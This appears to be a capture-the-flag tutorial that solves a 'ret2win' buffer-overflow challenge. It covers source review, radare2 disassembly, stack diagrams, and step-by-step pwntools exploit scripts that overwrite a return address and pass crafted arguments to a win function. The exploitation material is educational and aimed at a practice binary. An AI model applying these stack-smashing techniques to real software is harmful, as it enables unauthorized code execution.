#2: Ret to win

Based on the problem title, perhaps we will have to do something that deals with return addresses???? 

Let's run the binary, bufover-2, and see what we get. 

```
./bufover-2
Type something>aaaaaaaaaaaaaaa
You typed aaaaaaaaaaaaaaa!
```

Seems totally harmless, right? It's a lot like those beginner programs people write when they first start learning how to code. But we know there has to be a problem with this binary, maybe there's a rookie mistake somewhere.

Thankfully, the program authors provided us some source code. Let's take a look at bufover-2.c

```
void win(long long arg1, int arg2)
{
        if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
        {
                puts("Close, but not quite.");
                exit(1);
        }

        printf("You win!\n");
        char buf[256];
        FILE* f = fopen("./flag.txt", "r");
        if (f == NULL)
        {
                puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
        }
        else
        {
                fgets(buf, sizeof(buf), f);
                printf("flag: %s\n", buf);
        }
}

void vuln()
{
        char buf[16];
        printf("Type something>");
        gets(buf);
        printf("You typed %s!\n", buf);
}

int main()
{
        /* Disable buffering on stdout */
        setvbuf(stdout, NULL, _IONBF, 0);

        vuln();
        return 0;
}
```

Take a few moments to comb through this source code and come up with some conclusions. From reading this source code, here is what I gathered:
- First, the program runs main
- In main, the program calls a function called vuln.
- vuln uses the gets function to take user input, and then uses printf to tell the user what they typed
- 16 characters are allocated for the user input in a local variable called buf
- There is a win function in the program that prints the flag. Problem is, win is not called anywhere in the program execution
- The win function takes two arguments, arg1 and arg2. To get the flag to print, arg1 must equal 0x14B4DA55, and arg2 must equal 0xF00DB4BE

Notice the function gets. Recall that gets is a function that is vulnerable to [buffer overflows](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used). If you programming in C, you should avoid using gets (unless you are making pwn problems). 

In many binary exploitation problems, gets is often used, and is meant to be exploited. When you see gets, that's where you know where you can start exploiting a program. 

Why can't we just edit the source code and compile the program to run win? Remember that in CTFs, many of these binaries will be hosted on a server, so you can't do that. The problem authors will give you a copy of the binary to play with on your local machine, and then you connect to the server once you have gotten an exploit to work. 

Let's open up radare and look under the hood.

```
r2 -Ad ./bufover-2

Process with PID 24636 started...
= attach 24636 24636
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
Warning: r_bin_file_hash: file exceeds bin.hashlimit
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- Warning, your trial license is about to expire.
[0xf7f0cc70]> s main
[0x080492cf]> Vpp

```

I encourage you to explore the binary more on your own before proceeding (or you can just skip through if you're looking for the answer). 

Looking at the disassembly of main, it does what we expect. It calls vuln, so maybe we would find something more interesting if we looked at vuln instead. 

Disassembly of vuln below: 

```
 sym.vuln ();                                                                                                                                                                             
│           ; var int32_t var_18h @ ebp-0x18                                                                                                                                                   
│           0x08049293      55             push ebp                                                                                                                                            
│           0x08049294      89e5           mov ebp, esp                                                                                                                                        
│           0x08049296      83ec18         sub esp, 0x18                                                                                                                                       
│           0x08049299      83ec0c         sub esp, 0xc                                                                                                                                        
│           0x0804929c      6890a00408     push str.Type_something     ; 0x804a090 ; "Type something>"                                                                                         
│           0x080492a1      e88afdffff     call sym.imp.printf         ;[1] ; int printf(const char *format)                                                                                   
│           0x080492a6      83c410         add esp, 0x10                                                                                                                                       
│           0x080492a9      83ec0c         sub esp, 0xc                                                                                                                                        
│           0x080492ac      8d45e8         lea eax, [var_18h]                                                                                                                                  
│           0x080492af      50             push eax                                                                                                                                            
│           0x080492b0      e88bfdffff     call sym.imp.gets           ;[2] ; char *gets(char *s)                                                                                              
│           0x080492b5      83c410         add esp, 0x10                                                                                                                                       
│           0x080492b8      83ec08         sub esp, 8                                                                                                                                          
│           0x080492bb      8d45e8         lea eax, [var_18h]                                                                                                                                  
│           0x080492be      50             push eax                                                                                                                                            
│           0x080492bf      68a0a00408     push str.You_typed__s       ; 0x804a0a0 ; "You typed %s!\n"                                                                                         
│           0x080492c4      e867fdffff     call sym.imp.printf         ;[1] ; int printf(const char *format)                                                                                   
│           0x080492c9      83c410         add esp, 0x10                                                                                                                                       
│           0x080492cc      90             nop                                                                                                                                                 
│           0x080492cd      c9             leave                                                                                                                                               
└           0x080492ce      c3             ret      
```

We see a local variable, var_18h. Recall that when local variables are created, the space is allocated for that variable by subtracting from esp. So the variable is effectively stored below esp. Also recall that when functions are called, we store the previous value of ebp by pushing it onto the stack. We also store our return address.

Before allocation of local variables: 

```
HIGH MEMORY ADDRESSES
---- TOP ----
-> return address of main
-> old ebp
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

After allocation of local variables:
```
HIGH MEMORY ADDRESSES
---- TOP ----
-> return address of main
-> old ebp
-> Space
   for
   Local variables
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

Also recall from the previous problem that when we send in user input, though the stack grows down from high to low addresses, the local variable will grow up from low to high addresses.

So, we see that var_18h begins at ebp-0x18. That means it is stored 0x18 away from ebp in terms of memory addresses. 

To figure out our "buffer", or, how many characters we need to send before we start eating into the space of ebp with our input, we can easily calculate that buffer by converting 0x18 into decimal. 

0x18 is currently in hex. So to convert to decimal the math looks like this. 

```
1 * 16^1 + 8 * 16^0 = 24
```

Based on our math, when we send 24 characters, the program will have a segmentation fault (this is because strings always have to end with a null terminating character, so 23 characters won't give the program any issue. Try it out yourself!)

Let's try it. (Remember that you can use python to generate your buffers.)

24 A's as input

```
 ./bufover-2
Type something>AAAAAAAAAAAAAAAAAAAAAAAA
You typed AAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault
```

Cool! Now, 25 characters and up will start writing into ebp. Since ebp takes up 4 bytes of space in memory, we have to add an additional 4 characters to our 24 character buffer, and then we can overwrite the return address, so that instead of jumping back to main, we jump to win. 

Your current mental model of the stack should look like this, before we send our malicious input.

```
HIGH MEMORY ADDRESSES
---- TOP ----
-> return address of main
-> old ebp
-> Space
   for
   Local variables
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

Here is what we will manipulate the stack to look like with our input to get the win function to run. 

```
HIGH MEMORY ADDRESSES
---- TOP ----
-> return address of win that we sent through our input
-> 4 A's to fill up the space of EBP
-> 24 A's to fill up var_18h
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

Using radare, we can find the address of win. You can look through the disassembly by scrolling up to find the symbol that represents the win function. Then you can seek it. The memory address that appears will be the address of win. 

```
[0x080491c0]> s sym.win
[0x080491c2]> 
```

Let's write our initial exploit using pwn tools in python. 

```
#!/usr/bin/env python2

from pwn import *

#start the ./pwn1 process and save it in variable p
p = process('./bufover-2')

exploitBufferToOverwriteVarAndEBP = "A"*28

returnAddressOfWin = p32(0x080491c2)

exploitToSend = exploitBufferToOverwriteVarAndEBP + returnAddressOfWin

print(exploitToSend)
print(p.recvuntil('something'))

print(p.sendline(exploitToSend))

print(p.recv())
print(p.recv())
```

Now run it.

```
python exploit.py

[+] Starting local process './bufover-2': pid 26081
AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04
Type something
None
>
[*] Process './bufover-2' stopped with exit code 1 (pid 26081)
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04!
Close, but not quite.
```

Now, we know that the win function has succesfully run. But, we still don't have the flag. This is because we didn't pass the win function any arguments. 

Let's build our mental model of how we want to manipulate the stack to look. Remember that first we push the return address onto the stack, followed by the arguments, in reverse order. So first, we push arg1 onto the stack, and then we push arg2. So in our exploit, we will send the buffer, followed by the return address, followed by arg1, followed by arg2. 

```
HIGH MEMORY ADDRESSES
---- TOP ----
-> arg2
-> arg1 
-> return address of win that we sent through our input
-> 4 A's to fill up the space of EBP
-> 24 A's to fill up var_18h
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

Recall however, that arg1 is a long long int, so our normal p32 function in pwntools isn't going to do us any good when we send the value for arg1. We need to use p64(), as a long long int in c takes up 64 bits instead of 32. 

Cool, so we are fine to write our exploit now, right? 

```
#!/usr/bin/env python2

from pwn import *

#start the ./pwn1 process and save it in variable p
p = process('./bufover-2')

exploitBufferToOverwriteVarAndEBP = "A"*28

returnAddressOfWin = p32(0x080491c2)

arg1 = p64(0x14B4DA55)
arg2 = p32(0xF00DB4BE)


exploitToSend = exploitBufferToOverwriteVarAndEBP + returnAddressOfWin + arg1 + arg2

print(exploitToSend)
print(p.recvuntil('something'))

print(p.sendline(exploitToSend))

print(p.recv())
print(p.recv())

```

```
[+] Starting local process './bufover-2': pid 26915
AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04Uڴ\x14\x00\x00\xb4�
Type something
None
>
[*] Process './bufover-2' stopped with exit code 1 (pid 26915)
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04Uڴ\x14
Close, but not quite.
```

WAIT. I thought this was supposed to work!!!!!!!! What gives

We actually need some [padding](https://en.wikipedia.org/wiki/Data_structure_alignment) between the return address and arg1. Since arg1 is a long long int, we will need 4 bytes of padding before we send arg1.

Let's add to the exploit.

```
#!/usr/bin/env python2

from pwn import *

#start the ./pwn1 process and save it in variable p
p = process('./bufover-2')

exploitBufferToOverwriteVarAndEBP = "A"*28

returnAddressOfWin = p32(0x080491c2)

arg1 = p64(0x14B4DA55)
arg2 = p32(0xF00DB4BE)

paddingBetweenRetAddrAndArg1 = "A"* 4

exploitToSend = exploitBufferToOverwriteVarAndEBP + returnAddressOfWin + paddingBetweenRetAddrAndArg1 + arg1 + arg2

print(exploitToSend)
print(p.recvuntil('something'))

print(p.sendline(exploitToSend))

print(p.recv())
print(p.recv())
```

Then we run it...

```
[+] Starting local process './bufover-2': pid 27525
AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04AAAAUڴ\x14\x00\x00\xb4�
Type something
None
>
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04AAAAUڴ\x14
You win!
flag: flag{yee_yee_you_got_da_flagggg!!!!!}
```

Yee, we got the flag!!!!!!!

I encourage you to work on being able to comfortably do this problem on your own. Also poke around in radare, run the program, and visually see how the value of EBP changes depending on the input you pass it. 

## More resources to feed the brain
- [Data Structure Alignment](https://en.wikipedia.org/wiki/Data_structure_alignment)
- [Data Types in C](https://en.wikipedia.org/wiki/C_data_types)
- [Why you should not use gets](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)
- [How to print the value of registers in radare2](https://reverseengineering.stackexchange.com/questions/20540/how-to-print-the-value-of-register-with-radare-2)
